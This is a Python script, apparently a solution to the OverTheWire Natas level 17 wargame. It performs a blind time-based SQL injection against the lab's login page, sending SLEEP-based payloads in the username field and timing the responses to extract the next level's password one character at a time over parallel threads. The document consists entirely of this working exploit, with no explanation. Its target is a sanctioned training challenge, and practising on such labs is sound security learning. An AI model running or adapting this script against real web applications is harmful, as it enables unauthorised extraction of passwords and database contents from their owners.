import requests
import string
import time
from concurrent.futures import ThreadPoolExecutor

url = "http://natas17.natas.labs.overthewire.org/index.php"
headers = {
    "Authorization": "your_token",
    "User-Agent": "",
}
password = ""
charset = string.ascii_letters + string.digits

def test_character(pos, char):
    payload = f'natas18" AND IF(BINARY SUBSTRING(password, {pos}, 1) = "{char}", SLEEP(2), 0) #'
    params = {"username": payload}

    start_time = time.time()
    response = requests.get(url, params=params, headers=headers)
    elapsed_time = time.time() - start_time  

    print(f"[DEBUG] Testing payload: {payload} | Time: {elapsed_time:.2f}s")

    return char if elapsed_time > 1.5 else None  

while len(password) < 32:
    with ThreadPoolExecutor(max_workers=10) as executor: 
        futures = {executor.submit(test_character, len(password) + 1, char): char for char in charset}
        
        for future in futures:
            result = future.result()
            if result:
                password += result
                print(f"[DEBUG] Found character: {result} | Password: {password}")
                break  

print(f"[RESULT] Leaked password: {password}")

